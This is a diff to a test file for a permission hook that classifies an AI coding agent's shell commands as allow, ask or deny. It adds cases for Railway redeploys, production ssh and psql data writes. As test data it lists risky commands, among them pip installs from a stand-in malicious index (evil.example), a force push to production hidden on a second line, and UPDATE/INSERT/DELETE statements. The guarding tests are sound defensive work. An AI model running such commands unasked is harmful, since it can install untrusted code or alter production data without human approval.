@@ -57,6 +57,28 @@ CASES: list[tuple[str, str]] = [
     ("ask", "pip install git+https://github.com/x/y.git"),
     ("ask", "pip install -r requirements.txt --index-url https://evil.example/simple"),
     ("ask", "python -m pip install --extra-index-url https://evil.example/s foo"),
+    # SEC-13: Railway 변경·운영 접속, 공개 DB 주소, DB 쓰기 SQL 은 사용자 확인
+    ("ask", "railway redeploy -s web"),
+    ("ask", "railway --service web redeploy"),
+    ("ask", "railway variables --set A=1"),
+    ("ask", "railway variable set A=1"),
+    ("ask", "railway ssh"),
+    ("ask", "railway run python x.py"),
+    ("ask", "railway connect Postgres"),
+    ("ask", "timeout 5 railway up"),
+    ("ask", "bash -c 'railway redeploy'"),
+    ("ask", 'psql "postgresql://u@x.proxy.rlwy.net:1/db"'),
+    ("ask", 'psql -c "UPDATE users SET is_active = true WHERE id = 1"'),
+    ("ask", 'psql -c "INSERT INTO t VALUES (1)"'),
+    ("ask", "python -c \"cur.execute('DELETE FROM t WHERE id = 1')\""),
+    ("allow", "railway status"),
+    ("allow", "railway logs -s web -n 50"),
+    ("allow", "railway -s web logs"),
+    ("allow", "railway variables --service Postgres --kv"),
+    ("allow", "railway link --project FOMS-DEV"),
+    ("allow", 'psql -c "SELECT 1"'),
+    ("allow", "grep proxy.rlwy.net notes.md"),
+    ("allow", "python -c \"print('update notes')\""),
     # --- 우회 봉합: 첫 토큰 디스패치 우회(deny 유지) ---------------------
     # 개행 세그먼트 우회 (다줄 명령 2번째 줄부터의 위험 명령)
     ("deny", "git status\ngit push --force origin production"),
@@ -449,3 +471,25 @@ def test_deploy_push_allows_when_scope_empty(tmp_path: Path) -> None:
     )
     assert decision == "allow", label
     assert label == ""
+
+
+def test_claude_hook_error_asks_instead_of_allowing() -> None:
+    """판정 중 예외(깨진 페이로드)는 통과가 아니라 ask 로 닫는다(SEC-13)."""
+    payload = {"tool_name": "Bash", "tool_input": ["not", "a", "dict"]}
+    proc = subprocess.run(
+        [sys.executable, CLAUDE_HOOK],
+        input=json.dumps(payload),
+        cwd=REPO_ROOT,
+        capture_output=True,
+        text=True,
+        encoding="utf-8",
+        timeout=30,
+    )
+    data = json.loads(proc.stdout.strip())
+    assert data["hookSpecificOutput"]["permissionDecision"] == "ask"
+
+
+def test_session_start_drift_tool_only_queries_railway() -> None:
+    """세션 시작 훅이 부르는 drift 도구는 Railway GraphQL 조회만 한다(mutation 0)."""
+    source = (Path(REPO_ROOT) / "tools" / "ops" / "check_deploy_drift.py").read_text(encoding="utf-8")
+    assert "mutation" not in source.lower()
